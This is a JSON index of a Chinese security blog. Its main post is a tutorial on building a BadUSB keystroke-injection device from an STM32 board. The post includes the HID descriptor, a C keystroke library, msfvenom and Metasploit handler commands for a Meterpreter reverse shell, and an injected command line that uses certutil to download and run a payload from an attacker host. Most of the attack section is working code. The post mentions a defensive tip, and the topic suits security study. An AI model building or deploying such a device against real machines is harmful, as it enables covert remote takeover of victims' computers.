[{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2023-08-21T08:56:56.217Z","categories_index":"","tags_index":"","author_index":"Pa2sw0rd"},{"id":"68207a8407ad9919ae03a48d7f395abc","title":"路上的优盘不要捡！硬核打造BadUSB近源渗透神器，一秒上线MSF！","content":"简介&emsp; &emsp; 近期拿出吃灰的stm32f407开发板，研究学习一下hid设备的开发，来实现一个低成本的badusb，本文使用开发板来进行测试，当然有条件的小伙伴还可以进行PCB打样，打印外壳来实现一个仿真度相对高的badusb。&emsp; &emsp; BadUSB是一种伪装USB HID设备的攻击，hid设备是直接与人交互的设备，例如键盘、鼠标及游戏手柄等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般HID的攻击主要集中在鼠标键盘上，因为只要伪装成了用户交互设备，基本上就可以和用户的电脑进行交互，从而达到攻击的目的，而这一过程都是模拟人工操作，所以对于杀软来说就没办法进行查杀。应对这一攻击最有效的方法就是不要随意插入未知、不受信任的USB设备。&emsp; &emsp; github：https://github.com/Pa2sw0rd/stm32_keyboard_badusb\n\n环境准备\nSTM32F407ZGT6\nstm32cubeMX\nvscode\narm-gcc交叉编译器\njlink调试器\n\n初始化工程文件&emsp; &emsp;本文采用HAL库开发，使用stm32cubeMX来生成一个基本工程项目文件。&emsp; &emsp;这里使用普遍的USB2.0全速模式（FS），首先在Systen Core-RCC中配置为外部时钟。\n\n&emsp; &emsp;Connectivity-USB_OTG_FS中配置Mode为Device_Only。\n\n在Middleware-USB_DEVICE中配置Class For FS IP 为HID设备，可在配置项修改vip、pid、描述字符串等。\n\nFS的最大速率在12Mbps，USB的系统时钟要求是传输速率的四倍，因此USB的系统时钟要配置为48Mhz，这里使用外部晶振通过倍频得到，小伙伴们可以参考下图的时钟树配置（注意自己芯片的外部晶振频率）。\n\n至此，基本的一个USB工程配置完毕，根据自己的环境生成相应的工程文件即可，这里稍微增大了堆栈内存。\n\nHID描述符配置项目生成之后需要修改HID描述符，cubeMX默认生成的是鼠标设备，需要修改成键盘的描述符，报告描述符相当于HID设备的属性表。修改Middlewares\\ST\\STM32_USB_Device_Library\\Class\\HID\\Src\\usbd_hid.c中的HID_MOUSE_ReportDesc为键盘描述符，顺便修改数组大小常量HID_MOUSE_REPORT_DESC_SIZE为63。\n__ALIGN_BEGIN static uint8_t HID_MOUSE_ReportDesc[HID_MOUSE_REPORT_DESC_SIZE] __ALIGN_END &#x3D;\n&#123;\n  0x05, 0x01,&#x2F;&#x2F; USAGE_PAGE (Generic Desktop)\n  0x09, 0x06,&#x2F;&#x2F; USAGE (Keyboard)\n  0xa1, 0x01,&#x2F;&#x2F; COLLECTION (Application)\n  0x05, 0x07,&#x2F;&#x2F; USAGE_PAGE (Keyboard)\n  0x19, 0xe0,&#x2F;&#x2F; USAGE_MINIMUM (Keyboard LeftControl)\n  0x29, 0xe7,&#x2F;&#x2F; USAGE_MAXIMUM (Keyboard Right GUI)\n  0x15, 0x00,&#x2F;&#x2F; LOGICAL_MINIMUM (0)\n  0x25, 0x01,&#x2F;&#x2F; LOGICAL_MAXIMUM (1)\n  0x75, 0x01,&#x2F;&#x2F; REPORT_SIZE (1)\n  0x95, 0x08,&#x2F;&#x2F; REPORT_COUNT (8)\n  0x81, 0x02,&#x2F;&#x2F; INPUT (Data,Var,Abs)\n  0x95, 0x01,&#x2F;&#x2F; REPORT_COUNT (1)\n  0x75, 0x08,&#x2F;&#x2F; REPORT_SIZE (8)\n  0x81, 0x03,&#x2F;&#x2F; INPUT (Cnst,Var,Abs)\n  0x95, 0x05,&#x2F;&#x2F; REPORT_COUNT (5)\n  0x75, 0x01,&#x2F;&#x2F; REPORT_SIZE (1)\n  0x05, 0x08,&#x2F;&#x2F; USAGE_PAGE (LEDs)\n  0x19, 0x01,&#x2F;&#x2F; USAGE_MINIMUM (Num Lock)\n  0x29, 0x05,&#x2F;&#x2F; USAGE_MAXIMUM (Kana)\n  0x91, 0x02,&#x2F;&#x2F; OUTPUT (Data,Var,Abs)\n  0x95, 0x01,&#x2F;&#x2F; REPORT_COUNT (1)\n  0x75, 0x03,&#x2F;&#x2F; REPORT_SIZE (3)\n  0x91, 0x03,&#x2F;&#x2F; OUTPUT (Cnst,Var,Abs)\n  0x95, 0x06,&#x2F;&#x2F; REPORT_COUNT (6)\n  0x75, 0x08,&#x2F;&#x2F; REPORT_SIZE (8)\n  0x15, 0x00,&#x2F;&#x2F; LOGICAL_MINIMUM (0)\n  0x25, 0xFF,&#x2F;&#x2F; LOGICAL_MAXIMUM (255)\n  0x05, 0x07,&#x2F;&#x2F; USAGE_PAGE (Keyboard)\n  0x19, 0x00,&#x2F;&#x2F; USAGE_MINIMUM (Reserved (no event indicated))\n  0x29, 0x65,&#x2F;&#x2F; USAGE_MAXIMUM (Keyboard Application)\n  0x81, 0x00,&#x2F;&#x2F; INPUT (Data,Ary,Abs)\n  0xc0\n&#125;;\n修改USBD_HID_CfgDesc数组中的鼠标为键盘。\n\n按键数据报文处理封装上面的hid描述符决定了按键数据的报文格式，一个报文数据为8个字节，其具体意思可以描述为：\n&gt; BYTE1 -- 特殊按键\n&gt;\n&gt;     |--bit0:  Left Control是否按下，按下为1  \n&gt;\n&gt;     |--bit1:  Left Shift  是否按下，按下为1  \n&gt;\n&gt;     |--bit2:  Left Alt   是否按下，按下为1  \n&gt;\n&gt;     |--bit3:  Left GUI（Windows键） 是否按下，按下为1  \n&gt;\n&gt;     |--bit4:  Right Control是否按下，按下为1  \n&gt;\n&gt;     |--bit5:  Right Shift 是否按下，按下为1  \n&gt;\n&gt;     |--bit6:  Right Alt  是否按下，按下为1  \n&gt;\n&gt;     |--bit7:  Right GUI  是否按下，按下为1 \n&gt;\n&gt; BYTE2 -- 暂不清楚，有的地方说是保留位\n&gt;\n&gt; BYTE3--BYTE8 -- 这六个为普通按键\n第一个字节为四个功能键，只有六个字节是普通按键，也就是说，我们一次可以操作六个普通按键，可能也就是所谓的六键无冲。具体六个按键的键值可以参考usb官方文档（https://usb.org/sites/default/files/hut1_3_0.pdf），发现其键值和ASCII没啥联系，不可能写脚本的时候查表叭~~~所以这里就要自己封装一下，但好在其字母及数字部分是连续的，我们可以计算键值和ASCII的偏移来直接转码，不过特殊字符得手动处理一下喽，下面直接贴出代码，已实现常见需求，优化空间很大，小伙伴们可以自己优化一下呦~\n\nkey_parse.h#ifndef __KEY_PARSE_H\n#define __KEY_PARSE_H\n#define KEY_CONTROL 0x80&gt;&gt;3\n#define KEY_SHIFT 0x80&gt;&gt;2\n#define KEY_ALT 0X80&gt;&gt;1\n#define KEY_WIN 0X80&gt;&gt;0\n#define KEY_NULL 0x00          &#x2F;&#x2F; NULL\n#define KEY_ENTER 0x28         &#x2F;&#x2F; ENTER\n#define KEY_ESC 0x29           &#x2F;&#x2F; ESC\n#define KEY_BACKSPACE 0x2A     &#x2F;&#x2F; BACKSPACE\n#define KEY_TAB 0x2B           &#x2F;&#x2F; TAB\n#define KEY_F1 0x3A\n#define KEY_F2 0x3B\n#define KEY_F3 0x3C\n#define KEY_F4 0x3D\n#define KEY_F5 0x3E\n#define KEY_F6 0x3F\n#define KEY_F7 0x40\n#define KEY_F8 0x41\n#define KEY_F9 0x42\n#define KEY_F10 0x43\n#define KEY_F11 0x44\n#define KEY_F12 0x45\n#define KEY_PRT_SCR 0x46\n#define KEY_SCOLL_LOCK 0x47\n#define KEY_PAUSE 0x48\n#define KEY_INS 0x49\n#define KEY_HOME 0x4A\n#define KEY_PAGEUP 0x4B\n#define KEY_DEL 0x4C\n#define KEY_END 0x4D\n#define KEY_PAGEDOWN 0x4E\n#define KEY_RIGHT_ARROW 0x4F\n#define KEY_LEFT_ARROW 0x50\n#define KEY_DOWN_ARROW 0x51\n#define KEY_UP_ARROW 0x52\n#define KEY_DELAY 25&#x2F;&#x2F;HID发送延时\nstatic unsigned char key_data[8]&#x3D;&#123;0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00&#125;;&#x2F;&#x2F;hid发送缓冲数据\nunsigned char ascii_to_key(unsigned char ascii);&#x2F;&#x2F;转字母数字到一级字符，非一级字符返回0到parse_key处理\nunsigned char parse_key(unsigned char key);&#x2F;&#x2F;转二级字符（需按shift的字符）\nvoid key_print(unsigned char *string);&#x2F;&#x2F;键盘输出字符串\nvoid key_press(unsigned char key);&#x2F;&#x2F;按下功能键\nvoid key_unpress(void);&#x2F;&#x2F;弹起功能键\nvoid key_unpress_all(void);&#x2F;&#x2F;弹起所有键\nvoid pressFunction(unsigned char key);&#x2F;&#x2F;按下特殊键\n#endif\nkey_parse.c#include &quot;usbd_hid.h&quot;\n#include &quot;usb_device.h&quot;\n#include &quot;key_parse.h&quot;\nextern USBD_HandleTypeDef hUsbDeviceFS;\nunsigned char ascii_to_key(unsigned char ascii)&#123;\n    if(32&lt;&#x3D;ascii&amp;&amp;ascii&lt;&#x3D;126)&#123;\n        if(0x41&lt;&#x3D;ascii&amp;&amp;ascii&lt;&#x3D;0x5a)&#123;&#x2F;&#x2F;大写字母\n            return ascii-0x3d;\n        &#125;\n        if(0x61&lt;&#x3D;ascii&amp;&amp;ascii&lt;&#x3D;0x7a)&#123;&#x2F;&#x2F;小写字母\n            return ascii-0x5d;\n        &#125;\n        if(0x30&lt;&#x3D;ascii&amp;&amp;ascii&lt;&#x3D;0x39)&#123;&#x2F;&#x2F;数字\n            if(ascii&#x3D;&#x3D;0x30) return 0x27;\n            return ascii-0x13;\n        &#125;\n        switch (ascii)\n        &#123;\n            case &#39;-&#39;:return 0x2d;\n            case &#39;&#x3D;&#39;:return 0x2e;\n            case &#39;[&#39;:return 0x2f;\n            case &#39;]&#39;:return 0x30;\n            case &#39;;&#39;:return 0x33;\n            case 0x27:return 0x34;\n            case 0x5c:return 0x31;\n            case &#39;,&#39;:return 0x36;\n            case &#39;.&#39;:return 0x37;\n            case &#39;&#x2F;&#39;:return 0x38;\n            case &#39; &#39;:return KEY_SPACE;\n            default:return 0;\n        &#125;\n    &#125;else&#123;\n        return 0;\n    &#125;\n    return 0;\n&#125;\nunsigned char parse_key(unsigned char key)&#123;\n    &#x2F;&#x2F;unsigned char temp&#x3D;ascii_to_key(key);\n    switch (key)\n    &#123;\n        case &#39;!&#39;:return ascii_to_key(&#39;1&#39;);break;\n        case &#39;@&#39;:return ascii_to_key(&#39;2&#39;);break;\n        case &#39;#&#39;:return ascii_to_key(&#39;3&#39;);break;\n        case &#39;$&#39;:return ascii_to_key(&#39;4&#39;);break;\n        case &#39;%&#39;:return ascii_to_key(&#39;5&#39;);break;\n        case &#39;^&#39;:return ascii_to_key(&#39;6&#39;);break;\n        case &#39;&amp;&#39;:return ascii_to_key(&#39;7&#39;);break;\n        case &#39;*&#39;:return ascii_to_key(&#39;8&#39;);break;\n        case &#39;(&#39;:return ascii_to_key(&#39;9&#39;);break;\n        case &#39;)&#39;:return ascii_to_key(&#39;0&#39;);break;\n        case &#39;_&#39;:return ascii_to_key(&#39;-&#39;);break;\n        case &#39;+&#39;:return ascii_to_key(&#39;&#x3D;&#39;);break;\n        case &#39;&#123;&#39;:return ascii_to_key(&#39;[&#39;);break;\n        case &#39;&#125;&#39;:return ascii_to_key(&#39;]&#39;);break;\n        case &#39;:&#39;:return ascii_to_key(&#39;;&#39;);break;\n        case &#39;&quot;&#39;:return ascii_to_key(0x27);break;\n        case &#39;|&#39;:return ascii_to_key(0x5c);break;\n        case &#39;&lt;&#39;:return ascii_to_key(&#39;,&#39;);break;\n        case &#39;&gt;&#39;:return ascii_to_key(&#39;.&#39;);break;\n        case &#39;?&#39;:return ascii_to_key(&#39;&#x2F;&#39;);break;\n        default:return key;\n    &#125;\n    return key;\n&#125;\nvoid key_print(unsigned char *string)&#123;\n&#x2F;*\n输出字符\n*&#x2F;\n    unsigned int i,j,nextKey,temp;\n    i&#x3D;0;\n    j&#x3D;0;\n    while(string[i]!&#x3D;&#39;\\0&#39;)&#123; \n        temp&#x3D;ascii_to_key(string[i]);\n        nextKey&#x3D;ascii_to_key(string[i+1]);\n        if(temp)&#123;\n            key_data[2+j]&#x3D;temp;\n            j++;\n            if(j&#x3D;&#x3D;6)&#123;\n                j&#x3D;0;\n                USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n                HAL_Delay(KEY_DELAY);\n                key_unpress_all();\n                HAL_Delay(KEY_DELAY);\n            &#125;else if(!nextKey||parse_key(nextKey)&#x3D;&#x3D;temp)&#123;\n                j&#x3D;0;\n                USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n                HAL_Delay(KEY_DELAY);\n                key_unpress_all();\n                HAL_Delay(KEY_DELAY);\n            &#125;\n        &#125;else&#123;\n            temp&#x3D;parse_key(string[i]);\n            key_data[2+0]&#x3D;temp;\n            j++;\n            if(j&#x3D;&#x3D;6)&#123;\n                j&#x3D;0;\n                key_data[0]&#x3D;KEY_SHIFT;\n                USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n                HAL_Delay(KEY_DELAY);\n                key_unpress_all();\n                HAL_Delay(KEY_DELAY);\n            &#125;else if(nextKey||nextKey&#x3D;&#x3D;temp)&#123;\n                j&#x3D;0;\n                key_data[0]&#x3D;KEY_SHIFT;\n                USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n                HAL_Delay(KEY_DELAY);\n                key_unpress_all();\n                HAL_Delay(KEY_DELAY);\n            &#125;\n        &#125;\n        i++;\n        &#x2F;&#x2F;if(string[i]&#x3D;&#x3D;&#39;\\0&#39;) return;\n    &#125;\n&#125;\nvoid key_press(unsigned char key)&#123;\n&#x2F;*\n按下功能键盘\n*&#x2F;\n    key_data[0]&#x3D;key;\n    USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n    HAL_Delay(KEY_DELAY);\n&#125;\nvoid key_unpress(void)&#123;\n&#x2F;*\n弹起功能键盘\n*&#x2F;\n    key_data[0]&#x3D;0x00;\n    USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n&#125;\nvoid key_unpress_all(void)&#123;\n&#x2F;*\n弹起所有键\n*&#x2F;\n    for(unsigned char i&#x3D;0;i&lt;8;i++)&#123;\n        key_data[i]&#x3D;0x00;\n    &#125;\n    USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n&#125;\n\nvoid pressFunction(unsigned char key)&#123;\n    key_data[2]&#x3D;key;\n    USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n    HAL_Delay(KEY_DELAY);\n    key_unpress_all();\n    HAL_Delay(KEY_DELAY);\n&#125;\n\nMSF反弹shell这里仅作为badusb反弹测试，不做免杀，直接生成exe（端口默认）。\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.150.132 -f exe -o payload.exe\nmsf建立监听（端口默认）。\nuse exploit&#x2F;multi&#x2F;handler \nset payload payload&#x2F;windows&#x2F;meterpreter&#x2F;reverse_tcp\nrun\n使用python3起一个HTTP服务器来下载后门文件。\npython -m http.server\n&#96;&#96;&#96;        \n外设等初始化之后执行我们的脚本。\n&#96;&#96;&#96;c\nHAL_Delay(2000);&#x2F;&#x2F;延时两秒\nkey_press(KEY_WIN);&#x2F;&#x2F;按下win键\nkey_print(&quot;r&quot;);&#x2F;&#x2F;按下R键\nHAL_Delay(20);&#x2F;&#x2F;延时20毫秒\nkey_print(&quot;cmd &#x2F;c cd c:&#x2F;users&#x2F;admin&amp;certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.150.132:8000&#x2F;payload.exe&amp;payload.exe&quot;);&#x2F;&#x2F;输入字符串\npressFunction(KEY_ENTER);&#x2F;&#x2F;按下回车\nHAL_Delay(1000);&#x2F;&#x2F;延时一秒\nkey_press(KEY_ALT);&#x2F;&#x2F;按下alt键\npressFunction(KEY_F4);&#x2F;&#x2F;按下F4\nkey_unpress_all();&#x2F;&#x2F;避免给正常键盘造成影响，弹起所有按键","slug":"bad_usb","date":"2022-05-24T07:59:24.000Z","categories_index":"硬件,安全","tags_index":"硬件,BadUSB","author_index":"Pa2sw0rd"},{"id":"75dc71c860c86a8e5f068418d338fba8","title":"test_post","content":"testset\n\n\n","slug":"test-post","date":"2020-08-21T13:58:12.000Z","categories_index":"","tags_index":"","author_index":"Pa2sw0rd"}]